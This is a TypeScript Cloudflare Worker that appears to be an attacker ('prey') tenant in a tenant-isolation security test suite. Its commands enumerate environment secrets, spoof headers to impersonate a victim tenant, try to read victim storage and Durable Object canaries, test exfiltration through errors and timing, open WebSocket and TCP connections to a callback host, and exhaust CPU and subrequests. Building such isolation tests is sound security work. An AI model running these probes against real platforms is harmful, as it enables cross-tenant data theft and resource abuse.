export interface Env {
  PREY_KV?: KVNamespace;
  PREY_MARKER?: string;
  [key: string]: unknown;
}

let preyMarker = `prey-${Math.random().toString(36).slice(2)}`;

export default {
  async fetch(req: Request, env: Env): Promise<Response> {
    const url = new URL(req.url);
    const cmd = url.pathname.replace(/^\/cmd\/?/, "") || url.searchParams.get("cmd") || "health";

    try {
      if (cmd === "health") return json({ ok: true, tenant: "tenant-prey" });
      if (cmd === "env-enum") return json(envEnum(env));
      if (cmd === "metadata") return json(metadata(req, env));
      if (cmd === "try-fetch") return json(await tryFetch(required(url, "target")));
      if (cmd === "residual-b64") return json(await tryFetch(atob(required(url, "b64"))));
      if (cmd === "response-exfil") return responseExfil(url, env);
      if (cmd === "prey-kv-read") return json(await preyKvRead(required(url, "key"), env));
      if (cmd === "spoof-fetch") return json(await spoofFetch(required(url, "target")));
      if (cmd === "egress-primitives") return json(await egressPrimitives(url));
      if (cmd === "cpu-burn") return json(cpuBurn(Number(url.searchParams.get("ms") ?? "250")));
      if (cmd === "subrequest-fanout") return json(await subrequestFanout(required(url, "target"), Number(url.searchParams.get("count") ?? "10")));
      if (cmd === "cache-read") return json(await cacheRead(required(url, "key")));
      if (cmd === "cache-write") return json(await cacheWrite(required(url, "key"), url.searchParams.get("value") ?? preyMarker));
      if (cmd === "binding-access") return json(await bindingAccess(env));
      if (cmd === "do-reach") return json(await doReach(env));
      if (cmd === "amplify") return json(amplify(env));
      if (cmd === "echo-fetch") return json(await echoFetch(required(url, "target")));
      if (cmd === "isolate-marker") return json({ own_marker: preyMarker, foreign_marker_observed: false });
      return json({ ok: false, error: "unknown_cmd", cmd }, 404);
    } catch (err) {
      return json({ ok: false, error: err instanceof Error ? err.message : String(err) }, 500);
    }
  },
};

function envEnum(env: Env): Record<string, unknown> {
  const keys = Object.keys(env).sort();
  const bindings = keys.map((key) => {
    const value = env[key];
    return {
      key,
      type: typeof value,
      constructor: value && typeof value === "object" ? value.constructor?.name : undefined,
      dispatcher_get_callable: isDispatcherCandidate(key, value),
    };
  });
  const dispatcherKeys = bindings.filter((b) => b.dispatcher_get_callable).map((b) => b.key);
  const operatorKeys = keys.filter((key) => /DISPATCH|OUTBOUND|TRACE|TOKEN|ACCOUNT|SECRET/i.test(key));
  const secretLikeStrings = keys.filter((key) => typeof env[key] === "string" && /SECRET|TOKEN|KEY|ACCOUNT/i.test(key));
  return { ok: true, env_keys: keys, bindings, dispatcher_keys: dispatcherKeys, operator_keys: operatorKeys, secret_like_strings: secretLikeStrings };
}

function isDispatcherCandidate(key: string, value: unknown): boolean {
  if (!value || typeof value !== "object") return false;
  const hasGet = typeof (value as { get?: unknown }).get === "function";
  const ctor = value.constructor?.name ?? "";
  return hasGet && (/DISPATCH/i.test(key) || /Dispatch/i.test(ctor));
}

function metadata(req: Request, env: Env): Record<string, unknown> {
  const cf = (req as Request & { cf?: unknown }).cf;
  const nav = (globalThis as unknown as { navigator?: { userAgent?: string; language?: string } }).navigator;
  return {
    ok: true,
    request_cf_present: cf !== undefined,
    request_cf: cf ?? null,
    navigator: nav ? { userAgent: nav.userAgent, language: nav.language } : null,
    env_string_values: Object.fromEntries(Object.entries(env).filter(([, v]) => typeof v === "string")),
  };
}

async function tryFetch(target: string): Promise<Record<string, unknown>> {
  try {
    const res = await fetch(target);
    const text = await res.text();
    return { ok: true, reachable: res.ok, status: res.status, body_prefix: text.slice(0, 160) };
  } catch (err) {
    return { ok: true, reachable: false, error: err instanceof Error ? err.message : String(err) };
  }
}

async function responseExfil(url: URL, env: Env): Promise<Response> {
  const channel = url.searchParams.get("channel") ?? "body";
  const canary = (await env.PREY_KV?.get("wulf-canary-token")) ?? "PREY_CANARY_UNSEEDED";
  if (channel === "error") throw new Error(`p-out-05-error:${canary}`);
  if (channel === "timing") await sleep(canary.length * 5);
  return json({ ok: true, channel, canary });
}

async function preyKvRead(key: string, env: Env): Promise<Record<string, unknown>> {
  const value = await env.PREY_KV?.get(key);
  return { ok: true, key, value: value ?? null, read_via: "PREY_KV" };
}

async function spoofFetch(target: string): Promise<Record<string, unknown>> {
  const headers = new Headers({
    "x-wulf-customer-name": "tenant-victim",
    "x-forwarded-host": "tenant-victim.wulf.invalid",
    "x-forwarded-for": "203.0.113.44",
    "cf-connecting-ip": "203.0.113.44",
  });
  try {
    const res = await fetch(new Request(target, { headers }));
    return { ok: true, reachable: res.ok, status: res.status, body_prefix: (await res.text()).slice(0, 160) };
  } catch (err) {
    return { ok: true, reachable: false, error: err instanceof Error ? err.message : String(err) };
  }
}

async function egressPrimitives(url: URL): Promise<Record<string, unknown>> {
  const wsTarget = url.searchParams.get("ws") ?? "wss://callback.wulf.shart.cloud/ws";
  const tcpHost = url.searchParams.get("tcp_host") ?? "callback.wulf.shart.cloud";
  const tcpPort = Number(url.searchParams.get("tcp_port") ?? "80");

  const websocket = tryWebSocket(wsTarget);
  const tcpConnect = await tryTcpConnect(tcpHost, tcpPort);

  return { ok: true, websocket, tcp_connect: tcpConnect, dns_side_channel: { observable: false, tested: false, reason: "no non-fetch DNS primitive exposed by this tenant code" } };
}

function tryWebSocket(target: string): Record<string, unknown> {
  const WebSocketCtor = (globalThis as unknown as { WebSocket?: new (url: string) => unknown }).WebSocket;
  if (!WebSocketCtor) return { available: false, target, error: "WebSocket constructor unavailable" };
  try {
    const socket = new WebSocketCtor(target) as { close?: () => void };
    socket.close?.();
    return { available: true, target, constructed: true };
  } catch (err) {
    return { available: true, target, constructed: false, error: err instanceof Error ? err.message : String(err) };
  }
}

async function tryTcpConnect(hostname: string, port: number): Promise<Record<string, unknown>> {
  try {
    const sockets = (await import("cloudflare:sockets")) as { connect?: (address: { hostname: string; port: number }) => unknown };
    if (typeof sockets.connect !== "function") return { available: false, error: "connect export unavailable" };
    const socket = sockets.connect({ hostname, port }) as { close?: () => Promise<void> | void };
    await socket.close?.();
    return { available: true, host: hostname, port, connected: true };
  } catch (err) {
    return { available: false, host: hostname, port, error: err instanceof Error ? err.message : String(err) };
  }
}

function cpuBurn(ms: number): Record<string, unknown> {
  const started = Date.now();
  let iterations = 0;
  while (Date.now() - started < ms) iterations++;
  return { ok: true, requested_ms: ms, elapsed_ms: Date.now() - started, iterations };
}

async function subrequestFanout(target: string, count: number): Promise<Record<string, unknown>> {
  const attempts: Record<string, unknown>[] = [];
  for (let i = 0; i < count; i++) {
    try {
      const res = await fetch(`${target}${target.includes("?") ? "&" : "?"}fanout=${i}`);
      attempts.push({ index: i, status: res.status, ok: res.ok });
    } catch (err) {
      attempts.push({ index: i, error: err instanceof Error ? err.message : String(err) });
    }
  }
  return { ok: true, requested: count, completed: attempts.length, attempts };
}

async function cacheWrite(key: string, value: string): Promise<Record<string, unknown>> {
  await caches.default.put(new Request(key), new Response(value));
  return { ok: true, cache_key: key, wrote: true, value };
}

async function cacheRead(key: string): Promise<Record<string, unknown>> {
  const res = await caches.default.match(new Request(key));
  return { ok: true, cache_key: key, hit: Boolean(res), value: res ? await res.text() : null };
}

async function bindingAccess(env: Env): Promise<Record<string, unknown>> {
  const attempts = ["VICTIM_KV", "VICTIM_D1", "VICTIM_R2", "VICTIM_DO", "VICTIM_SECRET"];
  const seen = attempts.filter((name) => name in env);
  const reads: Record<string, unknown> = {};
  const maybeKv = env.VICTIM_KV as KVNamespace | undefined;
  if (maybeKv && typeof maybeKv.get === "function") {
    reads.VICTIM_KV = await maybeKv.get("secret-doc");
  }
  return { ok: true, prey_env_keys: Object.keys(env).sort(), victim_binding_guess_attempts: attempts, victim_bindings_present: seen, victim_reads: reads };
}

// P-TEN-04: attempt to reach a sibling tenant's Durable Object. Enumerate env for
// any DurableObjectNamespace-shaped binding (idFromName + get), construct an id for
// the victim's DO, and try to read its canary. With no victim-DO binding in prey's
// scope the namespace is unaddressable → all false.
async function doReach(env: Env): Promise<Record<string, unknown>> {
  const candidates = Object.keys(env).filter((k) => {
    const v = env[k] as { idFromName?: unknown; get?: unknown } | undefined;
    return Boolean(v) && typeof v === "object" && typeof v?.idFromName === "function" && typeof v?.get === "function";
  });
  const attempts: Record<string, unknown>[] = [];
  let idConstruction = false;
  let canaryRead = false;
  for (const name of candidates) {
    const ns = env[name] as { idFromName: (n: string) => unknown; get: (id: unknown) => { fetch: (r: string) => Promise<Response> } };
    try {
      const id = ns.idFromName("tenant-victim-do");
      idConstruction = true;
      const stub = ns.get(id);
      const res = await stub.fetch("https://do.wulf.invalid/canary");
      const text = await res.text();
      if (text.includes("flag{p-ten-04")) canaryRead = true;
      attempts.push({ binding: name, constructed: true, status: res.status, body_prefix: text.slice(0, 120) });
    } catch (err) {
      attempts.push({ binding: name, error: err instanceof Error ? err.message : String(err) });
    }
  }
  return { ok: true, do_namespace_bindings: candidates, id_construction_possible: idConstruction, do_canary_read: canaryRead, attempts };
}

// P-LIM-03: probe for ways to defer/fan-out work outside the per-invocation budget —
// DO alarms, Queue producers, or a secondary dispatch binding. None present in prey's
// scope means per-invocation limits also bound total tenant consumption.
function amplify(env: Env): Record<string, unknown> {
  const doBindings = Object.keys(env).filter((k) => {
    const v = env[k] as { idFromName?: unknown } | undefined;
    return Boolean(v) && typeof v === "object" && typeof v?.idFromName === "function";
  });
  const queueBindings = Object.keys(env).filter((k) => {
    const v = env[k] as { send?: unknown } | undefined;
    return Boolean(v) && typeof v === "object" && typeof v?.send === "function";
  });
  const dispatchBindings = Object.keys(env).filter((k) => {
    const v = env[k] as { get?: unknown } | undefined;
    return Boolean(v) && typeof v === "object" && typeof v?.get === "function" && /DISPATCH/i.test(k);
  });
  const alarm = doBindings.length > 0;
  const queue = queueBindings.length > 0;
  const dispatch = dispatchBindings.length > 0;
  return {
    ok: true,
    alarm_scheduling_available: alarm,
    queue_enqueue_available: queue,
    secondary_dispatch_available: dispatch,
    off_budget_work_achieved: alarm || queue || dispatch,
    do_bindings: doBindings,
    queue_bindings: queueBindings,
    dispatch_bindings: dispatchBindings,
  };
}

// P-CAP-03: fetch an (allowlisted) upstream and return its full response body. If the
// upstream reflects request headers, the operator-injected Authorization header added
// by wulf-outbound becomes visible to this user Worker.
async function echoFetch(target: string): Promise<Record<string, unknown>> {
  try {
    const res = await fetch(target);
    const text = await res.text();
    return { ok: true, reachable: res.ok, status: res.status, body: text.slice(0, 2000) };
  } catch (err) {
    return { ok: true, reachable: false, error: err instanceof Error ? err.message : String(err) };
  }
}

function required(url: URL, key: string): string {
  const value = url.searchParams.get(key);
  if (!value) throw new Error(`missing ${key}`);
  return value;
}

function json(body: unknown, status = 200): Response {
  return new Response(JSON.stringify(body, null, 2), { status, headers: { "content-type": "application/json" } });
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
